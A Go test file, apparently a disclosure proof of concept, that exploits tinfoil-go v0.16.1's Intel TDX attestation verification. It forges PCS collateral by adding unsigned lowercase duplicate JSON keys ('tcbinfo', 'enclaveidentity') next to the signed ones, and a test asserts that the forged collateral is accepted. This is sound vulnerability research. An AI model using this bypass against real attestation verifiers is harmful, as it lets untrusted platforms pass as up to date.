package tdx

// PoC 2b: same as PoC 2, against tinfoil-go v0.16.1 (the version pinned by
// tinfoil-proxy), production build.

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	tdxabi "github.com/google/go-tdx-guest/abi"
	tdxpb "github.com/google/go-tdx-guest/proto/tdx"
	tdxtestdata "github.com/google/go-tdx-guest/testing/testdata"
	"github.com/stretchr/testify/require"

	"github.com/tinfoilsh/tinfoil-go/verifier/document"
)

const (
	pocTcbURL    = "https://api.trustedservices.intel.com/tdx/certification/v4/tcb?fmspc=50806f000000"
	pocQeURL     = "https://api.trustedservices.intel.com/tdx/certification/v4/qe/identity"
	pocPckCrlURL = "https://api.trustedservices.intel.com/sgx/certification/v4/pckcrl?ca=platform&encoding=der"
	pocRootURL   = "https://certificates.trustedservices.intel.com/IntelSGXRootCA.der"
)

func pocLoad(t *testing.T, name, url string) ([]byte, map[string][]string) {
	t.Helper()
	dir := filepath.Join("testdata", "poc-casefold")
	body, err := os.ReadFile(filepath.Join(dir, name+".body"))
	require.NoError(t, err)
	f, err := os.Open(filepath.Join(dir, name+".headers"))
	require.NoError(t, err)
	defer f.Close()
	headers := map[string][]string{}
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1<<20), 1<<20)
	for sc.Scan() {
		k, v, ok := strings.Cut(sc.Text(), ":")
		if !ok || strings.HasPrefix(k, "HTTP/") {
			continue
		}
		headers[k] = append(headers[k], strings.TrimSpace(v))
	}
	return body, headers
}

func pocQuote(t *testing.T) []byte {
	t.Helper()
	parsed, err := tdxabi.QuoteToProto(tdxtestdata.RawQuote)
	require.NoError(t, err)
	q := parsed.(*tdxpb.QuoteV4)
	return tdxtestdata.RawQuote[:len(tdxtestdata.RawQuote)-len(q.GetExtraBytes())]
}

func pocCaseVariant(t *testing.T, body []byte, signedKey, variantKey string, override any) []byte {
	t.Helper()
	var top map[string]json.RawMessage
	require.NoError(t, json.Unmarshal(body, &top))
	ov, err := json.Marshal(override)
	require.NoError(t, err)
	out := []byte(`{"` + signedKey + `":`)
	out = append(out, top[signedKey]...)
	out = append(out, []byte(`,"`+variantKey+`":`)...)
	out = append(out, ov...)
	out = append(out, []byte(`,"signature":`)...)
	out = append(out, top["signature"]...)
	return append(out, '}')
}

func pocResponses(t *testing.T, forge bool) []document.PCSResponse {
	t.Helper()
	zeros := make([]map[string]any, 16)
	for i := range zeros {
		zeros[i] = map[string]any{"svn": 0}
	}
	var out []document.PCSResponse
	for _, e := range []struct{ name, url string }{{"tcb", pocTcbURL}, {"qeid", pocQeURL}, {"pckcrl", pocPckCrlURL}, {"rootcrl", pocRootURL}} {
		body, headers := pocLoad(t, e.name, e.url)
		if forge && e.name == "tcb" {
			body = pocCaseVariant(t, body, "tcbInfo", "tcbinfo", map[string]any{
				"tcbLevels": []any{map[string]any{"tcb": map[string]any{"sgxtcbcomponents": zeros, "pcesvn": 0, "tdxtcbcomponents": zeros}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}},
				"tdxModuleIdentities": []any{map[string]any{"id": "TDX_00", "mrsigner": strings.Repeat("0", 96), "attributes": "0000000000000000", "attributesMask": "FFFFFFFFFFFFFFFF",
					"tcbLevels": []any{map[string]any{"tcb": map[string]any{"isvsvn": 0}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}}}},
			})
		}
		if forge && e.name == "qeid" {
			body = pocCaseVariant(t, body, "enclaveIdentity", "enclaveidentity", map[string]any{
				"tcbLevels": []any{map[string]any{"tcb": map[string]any{"isvsvn": 0}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}},
			})
		}
		out = append(out, document.PCSResponse{URL: e.url, Headers: headers, BodyBase64: base64.StdEncoding.EncodeToString(body)})
	}
	return out
}

func TestPoC_v0161_Control(t *testing.T) {
	_, err := Authenticate(Evidence{Quote: pocQuote(t), PCS: pocResponses(t, false)}, nil)
	t.Logf("genuine collateral: %v", err)
	require.Error(t, err)
}

func TestPoC_v0161_UnsignedCaseVariantAccepted(t *testing.T) {
	q, err := Authenticate(Evidence{Quote: pocQuote(t), PCS: pocResponses(t, true)}, nil)
	require.NoError(t, err)
	t.Logf("ACCEPTED by tinfoil-go v0.16.1: identity=%s", q.Identity())
}
